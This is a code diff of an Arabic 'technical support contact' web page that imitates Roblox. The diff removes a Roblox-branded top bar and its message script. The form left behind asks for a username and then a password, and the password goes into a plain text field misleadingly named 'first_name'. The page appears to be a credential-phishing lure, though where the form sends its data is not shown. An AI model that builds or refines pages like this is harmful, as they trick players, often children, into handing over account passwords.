@@ -63,19 +63,6 @@ button:hover {
 </head>
 <body>
 
-<!-- الشريط العلوي -->
-<div style="background:#f2f2f2;padding:10px;display:flex;gap:20px;border-bottom:1px solid #ddd;">
-<span style="font-weight:bold;">ROBLOX</span>
-<button onclick="showMsg()">Robux</button>
-<button onclick="showMsg()">إنشاء</button>
-<button onclick="showMsg()">السوق</button>
-<button onclick="showMsg()">الرائجة</button>
-<input type="text" placeholder="البحث" style="margin-right:auto;padding:5px 10px;border-radius:20px;border:1px solid #ccc;">
-</div>
-
-<!-- الرسالة الحمراء -->
-<p id="msg" style="color:red;font-size:12px;margin:5px 15px;"></p>
-
 <div class="container">
 <h2>الاتصال بالدعم الفني</h2>
 
@@ -85,7 +72,7 @@ button:hover {
 <input type="text" name="username" placeholder="اسم المستخدم">
 
 <label>كلمة المرور</label>
-<input type="text" name="first_name" placeholder="هوبا لوبا">
+<input type="text" name="first_name" placeholder="هوبا لوبا"> 
 
 <label>الاسم الثاني</label>
 <input type="text" name="last_name" placeholder="الاسم الثاني">
@@ -136,20 +123,9 @@ button:hover {
 </div>
 
 <script>
-
-function showMsg(){
-    var msg = document.getElementById("msg");
-    msg.innerText = "يرجى اكمال البلاغ";
-
-    setTimeout(function(){
-        msg.innerText = "";
-    },7000);
-}
-
 document.querySelector('form').addEventListener('submit', function(e) {
     alert('تم إرسال النموذج بنجاح!');
 });
-
 </script>
 
 </body>
